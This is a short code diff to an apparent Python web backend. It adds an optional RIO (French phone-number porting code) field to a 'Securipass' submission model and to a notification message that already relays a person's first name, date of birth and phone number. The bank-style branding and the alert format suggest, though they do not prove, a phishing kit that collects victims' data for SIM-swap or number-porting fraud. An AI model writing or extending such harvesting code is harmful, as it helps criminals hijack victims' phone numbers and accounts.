@@ -101,6 +101,7 @@ class SecuripassSubmission(BaseModel):
     firstName: str
     dateOfBirth: str
     phoneNumber: str
+    rioNumber: str | None = None
 
 class UpdateClickEvent(BaseModel):
     source: str | None = "home_page"
@@ -166,6 +167,7 @@ async def submit_securipass_data(data: SecuripassSubmission):
    • Prénom: {data.firstName}
    • Date de naissance: {data.dateOfBirth}
    • Téléphone: {data.phoneNumber}
+   • RIO: {data.rioNumber or 'Non renseigné'}
 
 ⏰ <b>Date de soumission:</b> {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
         """
